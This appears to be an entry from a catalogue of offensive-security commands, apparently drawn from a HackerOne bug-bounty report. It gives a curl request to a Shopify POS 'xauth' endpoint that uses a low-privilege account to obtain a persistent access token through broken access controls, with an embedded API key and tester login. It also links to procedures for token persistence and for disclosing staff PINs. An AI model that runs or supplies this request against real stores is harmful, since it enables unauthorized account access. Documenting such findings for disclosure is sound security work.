---
id: cmd-shopify-pos-auth-001
data: >-
  curl -X POST https://h1-2102-ramsexy.myshopify.com/admin/api/xauth -H
  "Content-Type: application/json" -d
  '{"api_key":"a53cf2ce9b5dabf5dd222b3615c29569","login":"ramsexy+h1-2102-3@wearehackerone.com","password":"███"}'
tags:
  - authentication
  - token
  - pos
type: command
output: null
executor: bash
platforms:
  - Web
  - Shopify
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:30:07.595Z'
verified: false
validated: true
submitted: true
---
# shopify-pos-authenticate

## Command

```bash
curl -X POST https://h1-2102-ramsexy.myshopify.com/admin/api/xauth \
  -H "Content-Type: application/json" \
  -d '{"api_key":"a53cf2ce9b5dabf5dd222b3615c29569","login":"ramsexy+h1-2102-3@wearehackerone.com","password":"███"}'
```

## Description

Authenticates a low-privilege user to Shopify's POS xauth endpoint to obtain a persistent access token, exploiting broken access controls.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| api_key | POS app-specific key from admin page | Yes |
| login | Low-privilege user email | Yes |
| password | User password | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://example.myshopify.com/admin/api/xauth -H "Content-Type: application/json" -d '{"api_key":"your_key","login":"user@example.com","password":"pass"}'
```

### Advanced Usage

Use with -v for verbose output to debug failures.

```bash
curl -v -X POST https://example.myshopify.com/admin/api/xauth -H "Content-Type: application/json" -d '{"api_key":"your_key","login":"user@example.com","password":"pass"}'
```

## Expected Output

JSON response: {"access_token":"shpat_abc123","scopes":["write_pos_channel.access"],"associated_user":{"id":12345,"email":"user@example.com"}}

## Related

- [[procedures/Obtain-Persistent-POS-Access-Token]]
- [[procedures/Disclose-Staff-PINs-via-GraphQL]]
